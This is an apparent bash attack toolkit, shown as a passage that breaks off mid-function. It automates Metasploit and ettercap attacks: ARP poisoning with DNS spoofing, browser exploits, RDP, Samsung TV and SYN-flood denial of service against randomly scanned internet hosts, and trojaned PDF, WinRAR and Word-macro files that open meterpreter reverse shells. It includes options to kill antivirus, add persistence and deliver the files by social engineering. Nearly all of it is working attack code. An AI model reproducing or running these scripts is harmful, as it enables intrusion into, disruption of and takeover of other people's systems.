      xterm -T "r00tsect0r - Automated exploit: Browser_autopwn" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/server/browser_autopwn; set LHOST $lhost; set URIPATH $uripath; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//


      # stop apache2 webserver if is running
      /etc/init.d/apache2 stop

         # clean up script
         echo ${RedF}'_'${Reset};
         if [ -d $apache/$target ]; then
         rm -r $apache/$target
         echo ${RedF}[x]:[WAIT]:[ deleting old target from apache2 webroot ]${Reset};
         if [ -d $tWd ]; then
         rm -r $tWd
         echo ${RedF}[x]:[WAIT]:[ deleting old files from: $tWd ]${Reset};
         sleep 1
         cd $H0m3/opensource
      fi
   fi
fi
}












# -------------------------------
# Block target network access dns-spoof
# -------------------------------
sh_block () {
Colors;

         # clean up script
         if [ -e $H0m3/opensource/priv8/blocked.html ]; then
         rm -r $H0m3/opensource/priv8/blocked.html
         echo ${RedF}[x]:[WAIT]:[ Deleting old payload from cache ]${Reset};
         sleep 1
         sh_block

else

      echo ${YellowF}[+]${RedF}:${YellowF}[input exploit settings]${Reset};
      target=$(zenity --title="Input TARGET IP" --text "example: 192.168.1.68" --entry --width 300) > /dev/null 2>&1
      router=$(zenity --title="Input ROUTER IP" --text "example: 192.168.1.254" --entry --width 300) > /dev/null 2>&1

      # dowloading/clonning website target
      cd $H0m3/opensource/priv8
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ Downloading index.html ]${Reset};
      wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/blocked.html | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: blocked.html" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/animeleters.gif
         # redirect webdomains
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"

         # copy the folder to apache2 server
         cp blocked.html $apache/index.html
         cp animeleters.gif $apache/animeleters.gif
         sleep 1
         # start apache2 webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

        # start ARP poison
        echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
        echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
        echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
        ettercap -T -Q -i $inter -P dns_spoof -M arp /$target// /$router//
   cd $H0m3/opensource
   sh_cleee

fi
}


sh_cleee () {
Colors;

         # clean up script
         rm $apache/index.html
         rm $apache/animeleters.gif
         if [ -e $H0m3/opensource/priv8/blocked.html ]; then
         rm -r $H0m3/opensource/priv8/blocked.html

         if [ -e $H0m3/opensource/priv8/animeleters.gif ]; then
         rm -r $H0m3/opensource/priv8/animeleters.gif
         # stop apache2 webserver
         /etc/init.d/apache2 stop
         sleep 1
   fi
fi
}













# -------------------------------
# Samsung PLASMA TV Denial of service attack
# -------------------------------
sh_san () {
Colors;

      # user input
      report=$(zenity --title="Input REPORT-NAME" --text "example: PlasmaTVD0S.log" --entry --width 300) > /dev/null 2>&1
      echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
      many=$(zenity --scale --title "nº of hosts to search" --text "example: 1 TO 700" --min-value=1 --max-value=6000 --value=1 --step 1) > /dev/null 2>&1

      # scanning for targets
      echo ${BlueF}[*]${RedF}:${BlueF}[Please  Wait]${RedF}:${GreenF}[ Searching targets ]${Reset};
      sleep 1
      nmap -iR $many -Pn -p 5600 --open -oN $H0m3/opensource/logs/$report | zenity --progress --pulsate --title "PLASMA_TV_D0S" --text="please be patience...\nsearching in WAN for port 5600 tcp open\nSearching:[$many]Targets in:[1024]Random hosts" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      zenity --title="Scan Completed" --text "edit $report file?" --info  --width 300 > /dev/null 2>&1

         # edit nmap report file and input target
         leafpad $H0m3/opensource/logs/$report > /dev/null 2>&1
         target=$(zenity --title="Input TARGET IP" --text "example:202.108.90.171" --entry --width 300) > /dev/null 2>&1

    # exploit target (0Day)
    echo ${BlueF}[*]${RedF}:${BlueF}[Target host]${RedF}:${GreenF}[ ONLINE ]${Reset};
    echo ${BlueF}[*]${RedF}:${BlueF}[please Wait]${RedF}:${GreenF}[ RUNNING EXPLOIT ]${Reset};
    cd $H0m3/opensource/modules
    xterm -T "r00tsect0r - Automated exploit: Samsung Plasma TV DoS attack" -geometry 110x23 -e "./samsung_reset.py $target"
    zenity --title="REMARK" --text "access $report in:\n/opensource/logs" --info > /dev/null 2>&1
    cd $H0m3/opensource/logs
    cd $H0m3/
}













# -------------------------------
# denial-of-service againts RDP protocol
# -------------------------------
sh_rdp () {
Colors;

      # user input
      echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
      report=$(zenity --title="Input REPORT-NAME" --text "example: RDPD0S.log" --entry --width 300) > /dev/null 2>&1
      many=$(zenity --scale --title "nº of hosts to search" --text "example: 1 TO 700" --min-value=1 --max-value=6000 --value=1 --step 1) > /dev/null 2>&1

      # scanning for targets
      echo ${BlueF}[*]${RedF}:${BlueF}[Please  Wait]${RedF}:${GreenF}[ Searching targets ]${Reset};
      sleep 1
      nmap -iR $many -Pn -p 3389 --open -oN $H0m3/opensource/logs/$report | zenity --progress --pulsate --title "RDP_D0S_ATTACK" --text="Please be patience...\nsearching in WAN for port: 3389 tcp open\nSearching:[$many]Targets in:[1024]Random hosts" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      zenity --title="Scan Completed" --text "edit $report file?" --info --width 300 > /dev/null 2>&1

         # edit nmap report file and input target
         leafpad $H0m3/opensource/logs/$report > /dev/null 2>&1
         RHOST=$(zenity --title="Input TARGET IP" --text "example:202.108.90.171" --entry --width 300) > /dev/null 2>&1

    # exploit target
    echo ${BlueF}[*]${RedF}:${BlueF}[check host.]${RedF}:${GreenF}[ $RHOST ]${Reset};
    echo ${BlueF}[*]${RedF}:${BlueF}[Target host]${RedF}:${GreenF}[ ONLINE ]${Reset};
    echo ${BlueF}[*]${RedF}:${BlueF}[please Wait]${RedF}:${GreenF}[ RUNNING EXPLOIT ]${Reset};
    xterm -T "r00tsect0r - Automated exploit: denial-of-service against RDP target" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOST $RHOST; set RPORT 3389; exploit'"
    zenity --title="T00LKIT LOGS" --text "access $report in:\n/opensource/logs" --info --width 300 > /dev/null 2>&1
    cd $H0m3/opensource/logs
    cd $H0m3/
}














# -------------------------------
# denial-of-service againts target website using SYN flood
# -------------------------------
sh_webdos () {
Colors;

      echo ${YellowF}[+]${RedF}:${YellowF}[input settings]${Reset};
      target=$(zenity --title="Input TARGET IP" --text "example: 192.168.2.10" --entry --width 300) > /dev/null 2>&1
      timeout=$(zenity --scale --title "Input TIMEOUT" --text "example: 1 TO 500" --min-value=1 --max-value=500 --value=1 --step 1) > /dev/null 2>&1

         # ping target to see if is alive
         ping -c 1 $target > /dev/null 2>&1
         if [ "$?" != 0 ]

then

    # error target offline
    echo ${RedF}[x]:${BlueF}['ping' target]${RedF}:${white}Target seems to be${RedF}:[ offline ]${Reset};
    sleep 1
    echo ${RedF}[x]:[quit exploit]:[ Denial-Of-Service ]${Reset};
    sleep 8

else

    # exploit target using nmap SYN packets
    echo ${BlueF}[*]${RedF}:${BlueF}[Target host]${RedF}:${GreenF}[ ONLINE ]${Reset};
    echo ${BlueF}[*]${RedF}:${BlueF}[please Wait]${RedF}:${GreenF}[ RUNNING EXPLOIT ]${Reset};
    xterm -T "r00tsect0r - Automated exploit: denial-of-service (SYN) against target website" -geometry 110x23 -e "sudo msfconsole -x 'use auxiliary/dos/tcp/synflood; set RHOST $target; set INTERFACE $inter; set TIMEOUT $timeout; exploit'"
    sleep 2
    clear
fi
}








# ----------------------------------
# firefox_xpi_bootstrapped_addon 
# ----------------------------------
sh_firefoxaddon () {
Colors;

      echo ${YellowF}[+]${RedF}:${YellowF}[Input payload settings]${Reset};
      srvhost=$(zenity --title="Input SRVHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      srvport=$(zenity --title="Input SRVPORT" --text "example: 8080" --entry --width 300) > /dev/null 2>&1
      addonname=$(zenity --title="Input ADDONNAME" --text "example: addon block" --entry --width 300) > /dev/null 2>&1
      uripath=$(zenity --title="Input URIPATH" --text "example: /mozilla" --entry --width 300) > /dev/null 2>&1
      title=$(zenity --title="Input HTML TITLE" --text "example: Extras:Addons" --entry --width 300) > /dev/null 2>&1
      echo -n "[-]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[-]:{leave blank to poison all local network}(enter target ip address):"
      read victim

         # building index.htm with meta-tag injection
         cd $H0m3/opensource/priv8
         echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ index.html ]${Reset};
         echo "<html><head></head><body>" > index.html
         echo "<title>$addonname:$title</title><br /><br />" >> index.html
         echo "<center><b>ERROR:404:FIREFOX:MISSING:PLUGIN:$addonname!</b></center>" >> index.html
         echo "<link rel="shortcut icon" type="image/x-icon" a href="https://addons.cdn.mozilla.net/media/img/favicon.ico">" >> index.html
         echo "<meta http-equiv='refresh' content='5; url=http://$srvhost:$srvport$uripath' />" >> index.html
         echo "</body></html>" >> index.html

cat << !

     Payload [addon_xpi] Final Config:
     =================================
     SRVHOST          : $srvhost
     SRVPORT          : $srvport
     ADDONNAME        : $addonname
     HTMLTITLE        : $addonname:$title
     EXPLOIT          : exploit/multi/browser/firefox_xpi_bootstrapped_addon
     INJECTION        : <meta http-equiv='refresh' content='5; url=http://$srvhost:$srvport$uripath' />
     STORAGE IN       : $apache/index.html
     AFFECTED SYSTEMS : firefox webBrowser (Windows OS)

!
         sleep 2
         cp index.html $apache/index.html
         # start apache2 webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

      # setting arp poison
      echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
      read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"

         # starting a metasploit listenner (target 1 native payload)
         echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
         echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
         echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
         echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
         sleep 2
         xterm -T "r00tsect0r - Automated exploit: firefox_xpi_bootstrapped_addon" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/firefox_xpi_bootstrapped_addon; set TARGET 1; set ADDONNAME $addonname; set SRVHOST $srvhost; set URIPATH $uripath; set AutoUninstall 1; set SRVPORT $srvport; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$victim//

}









# -------------------------------
# adobe pdf reader backdoor
# -------------------------------
sh_PDF () {
Colors;

   # get user input to build the payload
   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 300) > /dev/null 2>&1
   pathexe=$(zenity --title "☠ Chose .pdf file to be embedeb ☠" --filename=$H0m3/opensource/templates/ --file-selection) > /dev/null 2>&1
   paname=$(zenity --title="Name your PDF" --text "example: nasa.pdf" --entry --width 300) > /dev/null 2>&1

     # CHOSE WHAT PAYLOAD TO USE
     payload=$(zenity --list --title "ADOBE_PDF_EMBEBED" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/messagebox" FALSE "windows/download_exec" FALSE "windows/meterpreter/reverse_tcp" --width 350 --height 240) > /dev/null 2>&1
     echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $paname ]${Reset};

      # building the trojan
      xterm -T "r00tsect0r - [PDF Backdoor] building payload" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/windows/fileformat/adobe_pdf_embedded_exe; set LHOST $lhost; set LPORT $lport; set INFILENAME $pathexe; set FILENAME $paname; set PAYLOAD $payload; exploit'"


        # execute privs on trojan generated
        cd $H0m3/.msf4/local
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ move payload to working Dir ]${Reset};
        mv $paname $H0m3/opensource/priv8/$paname

cat << !

     Payload [PDF] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $paname
     STORAGE IN       : $H0m3/opensource/priv8/$paname
     PAYLOAD          : $payload
     AFFECTED SYSTEMS : Adobe Reader v8.x, v9.x (Windows XP SP3 English/Spanish)

!

   echo ${BlueF}[*]${RedF}:${white}send ${GreenF}[$paname]${white} to a target machine using social engineering${Reset};
   echo ${BlueF}[*]${RedF}:${white}or post the provided URL 'if' used [ windows/download_exec ]${Reset};
   QuE=$(zenity --question --title "ADOBE READER PDF BACKDOOR" --text "\n  -:[ START A LISTENNER ? ]:-" --width 350) > /dev/null 2>&1

     if [ "$?" -eq "0" ]; then
       sh_pdf33 # jump to listenner

     else

       echo ${RedF}[x]:[ QUITTING ]... ${Reset};
       sleep 2

     fi
}



sh_pdf33 () {
Colors;

      if [ "$payload" = "windows/download_exec" ]; then
         # starting a metasploit listenner
         echo -n "[+]:{provided URL of stored payload}(URL):"
         read url
         echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
         echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
         sleep 2
         xterm -T "r00tsect0r - [PDF Backdoor] building payload" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set URL $url; set PAYLOAD $payload; exploit'"


      elif [ "$payload" = "windows/messagebox" ]; then
         # starting a metasploit listenner
         echo -n "[+]:{NO|ERROR|INFORMATION|WARNING|QUESTION}(ICON):"
         read icon
         echo -n "[+]:{msg of text box}(TEXT):"
         read text
         echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
         echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
         sleep 2
         xterm -T "r00tsect0r - [PDF Backdoor] windows/messagebox listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; set ICON $icon; set TEXT $text; exploit'"


      elif [ "$payload" = "windows/meterpreter/reverse_tcp" ]; then
        # starting a metasploit listenner
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
        sleep 2
        xterm -T "r00tsect0r - [PDF Backdoor] windows x86 [native payload] listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $payload; exploit'"

           # 'shell_listenner.rc' file with msf settings will be stored under
           # '/opensource/priv8/' if we wish to start a listenner later...
           echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
           sleep 1
           cd $H0m3/opensource/priv8
           mkdir handler > /dev/null 2>&1
           cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$paname" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

           echo "use exploit/multi/handler" > $resource-handler.rc
           echo "set PAYLOAD $payload" >> $resource-handler.rc
           echo "set LPORT $lport" >> $resource-handler.rc
           echo "set LHOST $lhost" >> $resource-handler.rc
           echo "set ExitOnSession false" >> $resource-handler.rc
           echo "exploit -j -z" >> $resource-handler.rc
           zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
         sleep 2
         clear


else

    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    sleep 2
    clear

fi
}









# -------------------------------
# winrar backdoor
# -------------------------------
sh_winrar () {
Colors;

   # get user input to build the payload
   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   filename=$(zenity --title="Input FILENAME" --text "name your ZIP file\nexample: fotos.zip" --entry --width 300) > /dev/null 2>&1
   spoof=$(zenity --title="Input SPOOF file" --text "example: Readme.txt" --entry --width 300) > /dev/null 2>&1

   # building payload
   echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $filename ]${Reset};
   xterm -T "r00tsect0r - Building: $filename" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set LHOST $lhost; set SPOOF $spoof; set TARGET 0; exploit'"
      # set permissions to file and copy to opensource folder
      cd $H0m3/.msf4/local
      chmod +x $filename
      mv $filename $H0m3/opensource/priv8/$filename

cat << !

     Payload [WINRAR] Final Config:
     ============================
     LHOST            : $lhost
     FILENAME         : $filename
     SPOOF            : $spoof
     STORAGE IN       : $H0m3/opensource/priv8/$filename
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : windows OS (winrar)

!
   echo ${BlueF}[*]${RedF}:${white}send ${GreenF}[$filename]${white} to a target machine using social engineering${Reset};
   pass=$(zenity --question --title "WINRAR BACKD00R" --text "\n  -:[ START A LISTENNER ? ]:-" --width 320) > /dev/null 2>&1

     if [ "$?" -eq "0" ]; then
       sh_rar2 # jump to listenner

     else

       echo ${RedF}[x]:[ QUITTING]... ${Reset};
       sleep 2

     fi
}



sh_rar2 () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
pass2=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass2" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $filename Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set AutoRunScript migrate -n $mig; exploit'"
      sh_rc2 # build resource file (latest listenner settings)


      elif [ "$pass2" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $filename Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set AutoRunScript killav; exploit'"
      sh_rc2 # build resource file (latest listenner settings)


      elif [ "$pass2" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $filename Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set AutoRunScript scaper; exploit'"
      sh_rc2 # build resource file (latest listenner settings)


      elif [ "$pass2" = "persistence" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $filename Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'"
      sh_rc3 # build resource file (latest listenner settings)


      elif [ "$pass2" = "Default listenner" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $filename Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
      sh_rc2 # build resource file (latest listenner settings)


      elif [ "$pass2" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $filename Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'"
      sh_rc2 # build resource file (latest listenner settings)


else


    # CANCEL BUTTON PRESS QUITTING
    echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
    cd $H0m3/opensource
    sleep 2
    clear
fi
}


sh_rc2 () {
Colors;

        # 'shell_listenner.rc' file with msf settings will be stored under
        # '/opensource/priv8/' if we wish to start a listenner later...
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
        sleep 1
        cd $H0m3/opensource/priv8
        mkdir handler > /dev/null 2>&1
        cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$filename" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

        echo "use exploit/multi/handler" > $resource-handler.rc
        echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-handler.rc
        echo "set LHOST $lhost" >> $resource-handler.rc
        echo "set ExitOnSession false" >> $resource-handler.rc
        echo "exploit -j -z" >> $resource-handler.rc
        zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
      cd $H0m3/opensource
      clear
}



sh_rc3 () {
Colors;

        # 'shell_listenner.rc' file with msf settings will be stored under
        # '/opensource/priv8/' if we wish to start a listenner later...
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
        sleep 1
        cd $H0m3/opensource/priv8
        mkdir handler > /dev/null 2>&1
        cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$filename" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

        echo "use exploit/multi/handler" > $resource-persistence.rc
        echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-persistence.rc
        echo "set LPORT 8080" >> $resource-persistence.rc
        echo "set LHOST $lhost" >> $resource-persistence.rc
        echo "set ExitOnSession false" >> $resource-persistence.rc
        echo "exploit -j -z" >> $resource-persistence.rc
        zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-persistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
      cd $H0m3/opensource
      clear
}










# -------------------------------
# VBS word.doc injection (using macro)
# -------------------------------
sh_vbs () {
Colors;

   # get user input to build the payload
   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
   paname=$(zenity --title="Name your VBS" --text "example: hidden.vbs" --entry --width 300) > /dev/null 2>&1


   # building payload
   echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $paname ]${Reset};
   cd $H0m3/opensource/priv8
   xterm -T "r00tsect0r - building $paname" -geometry 110x23 -e "msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 9 -f vba-exe > $H0m3/opensource/priv8/$paname"

      # set permissions to file
      chmod +x $paname

cat << !

     Payload [VBS] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $paname
     STORAGE IN       : $H0m3/opensource/priv8/$paname
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : microsoft word doc (windows OS)

     +----------------------------------------------------+
     |        MICROSOFT WORD DOC MACRO CONFIG STEPS       |
     +----------------------------------------------------+
     | 1º make a new microsoft word document              |
     | 2º open word.doc => create => tools => macro       |
     | 3º Paste the vbs cod into 'visual basic editor'    |
     | 4º Paste first portion of the cod into the editor  |
     | 5º The second part into the word document itself   |
     | 6º save the word.doc and send it to target machine |
     +----------------------------------------------------+

!
Colors;

      echo ${BlueF}[*]${RedF}:${white}start a listenner?${Reset};
      read -p "[+]:{yes|quit}(choise):" pass
      if [ "$pass" = "yes" ]; then

         # starting a metasploit listenner
         echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
         echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
         sleep 2
         xterm -T "r00tsect0r - [VBS macro injection] listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"

           # 'shell_listenner.rc' file with msf settings will be stored under
           # '/opensource/priv8/' if we wish to start a listenner later...
           echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
           sleep 1
           cd $H0m3/opensource/priv8
           mkdir handler > /dev/null 2>&1
           cd handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$paname" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

           echo "use exploit/multi/handler" > $resource-handler.rc
           echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-handler.rc
           echo "set LPORT $lport" >> $resource-handler.rc
           echo "set LHOST $lhost" >> $resource-handler.rc
           echo "set ExitOnSession false" >> $resource-handler.rc
           echo "exploit -j -z" >> $resource-handler.rc
           zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
         cd $H0m3/opensource
        clear

else

   Colors;
   echo ${RedF}[x]:[ QUITTING ]${Reset};
   sleep 2

fi
}








# ----------------------------------------------------------------------------------------------
# hackingteam adobe_flash_exploit (browser exploit)
# ----------------------------------------------------------------------------------------------
sh_hackingteam () {
Colors;

      echo ${YellowF}[+]${RedF}:${YellowF}[Input payload settings]${Reset};
      choset=$(zenity --list --title "CHOSE TARGET O.S." --radiolist --column "Pick" --column "Option" TRUE "windows systems" FALSE "linux systems" --width 300 --height 165) > /dev/null 2>&1
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT" --text "example: 8080" --entry --width 300) > /dev/null 2>&1
      uripath=$(zenity --title="Input URIPATH" --text "example: adobe support" --entry --width 300) > /dev/null 2>&1
      title=$(zenity --title="Input HTML TITLE" --text "example: adobe flash missing addon" --entry --width 300) > /dev/null 2>&1
      echo -n "[-]:{leave blank to poison all local network}(enter router ip address):"
      read router
